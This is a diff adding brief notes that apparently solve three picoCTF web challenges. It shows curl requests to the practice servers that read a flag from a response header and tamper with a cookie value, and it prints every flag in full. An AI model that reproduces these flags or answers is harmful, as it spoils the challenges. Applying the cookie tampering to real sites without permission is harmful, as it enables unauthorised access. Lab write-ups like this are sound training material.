@@ -1,0 +1,12 @@
+1-->Head flag
+curl -I HEAD -i http://mercury.picoctf.net:53554/
+HTTP/1.1 200 OK
+flag: picoCTF{r3j3ct_th3_du4l1ty_2e5ba39f}
+Content-type: text/html; charset=UTF-8
+2-->Cookies
+Set url
+curl -b "name=10" http://mercury.picoctf.net:6418/
+picoCTF{3v3ry1_l0v3s_c00k135_88acab36}
+3-->Insp3ct0r
+Inspec HTML code first part picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?f10be399}
+
